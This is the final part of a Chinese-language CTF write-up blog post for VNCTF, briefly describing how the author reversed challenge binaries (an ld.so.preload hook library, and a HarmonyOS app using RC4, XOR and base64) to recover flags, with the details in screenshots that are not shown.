+<p>​<img src="/assets/image-20250209130758-co77790.png" alt="image">​</p>
+<p>哦呼，对上了</p>
+<p>​<img src="/assets/image-20250209130832-xid21cc.png" alt="image">​</p>
+<p>然后异或1</p>
+<p>得到flag</p>
+<p>​<img src="/assets/image-20250209130912-f886pg6.png" alt="image">​</p>
+<p>实际修改位置在<code>ld.so.preload</code>​加载的<code>/usr/libexec/libexec.so</code>​</p>
+<p>​<img src="/assets/image-20250210110748-xo24deb.png" alt="image">​</p>
+<p>​<img src="/assets/image-20250210110757-mte0djc.png" alt="image">​</p>
+<p>对两个系统函数进行hook，修改了内容</p>
+<h1 id="抽奖转盘"><a href="#抽奖转盘" class="headerlink" title="抽奖转盘"></a>抽奖转盘</h1><p>赛后出的，还是太菜了</p>
+<p>鸿蒙逆向没法调试，可以用deveco开虚拟机看看界面</p>
+<p>主界面输入框加按钮</p>
+<p>​<img src="/assets/image-20250210111236-5qn2y18.png" alt="image">​</p>
+<p>找到回调函数，跟进</p>
+<p>​<img src="/assets/image-20250210111309-mbnb0f5.png" alt="image">​</p>
+<p>直接调用native层</p>
+<p>​<img src="/assets/image-20250210113251-0bdc0yq.png" alt="image">​</p>
+<p>rc4多进行一步异或</p>
+<p>再进行 标准base64</p>
+<p>​<img src="/assets/image-20250210113426-b9qcxa4.png" alt="image">​</p>
+<p>这里从index中获取加密后的数据</p>
+<p>​<img src="/assets/image-20250210113531-js7b2hz.png" alt="image">​</p>
+<p>再进行一步操作，然后比较</p>
+<p>​<img src="/assets/image-20250210113557-njr2y8b.png" alt="image">​</p>
+<p>最后解密即可</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://1ncharles.github.io">Britney</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://1ncharles.github.io/2025/02/10/VNCTF%20WP/">https://1ncharles.github.io/2025/02/10/VNCTF%20WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://1ncharles.github.io" target="_blank">Britney的小屋</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Britney</div><div class="author-info-description">喵喵喵~</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1ncharles"><i></i><span>前往小家...</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/1nCharles" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:muxiaofengxi@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget" id="newYear"><div class="item-headline"><i></i><span></span></div><div class="item-content"><div id="newYear-main"><div class="mask"></div> <p class="title"></p> <div class="newYear-time"></div> <p class="today" style="text-align: right;"></p> </div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VNCTF-WP"><span class="toc-number">1.</span> <span class="toc-text">VNCTF WP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easymath%E2%80%8B"><span class="toc-number">2.</span> <span class="toc-text">easymath​</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VN-Lang"><span class="toc-number">3.</span> <span class="toc-text">VN_Lang</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E4%B8%AA%E5%88%B0%E5%90%A7%E2%80%8B"><span class="toc-number">4.</span> <span class="toc-text">签个到吧​</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hook-Fish"><span class="toc-number">5.</span> <span class="toc-text">Hook Fish</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fuko%E2%80%99s-starfish"><span class="toc-number">6.</span> <span class="toc-text">Fuko’s starfish</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kotlindroid%E2%80%8B"><span class="toc-number">7.</span> <span class="toc-text">kotlindroid​</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AndroidLux"><span class="toc-number">8.</span> <span class="toc-text">AndroidLux</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%BD%E5%A5%96%E8%BD%AC%E7%9B%98"><span class="toc-number">9.</span> <span class="toc-text">抽奖转盘</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Britney</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer data-pjax src="/js/readPercent.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="/js/lunar.js"></script><script defer src="/js/day.js"></script><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async data-pjax src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><script async data-pjax src="/js/year.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
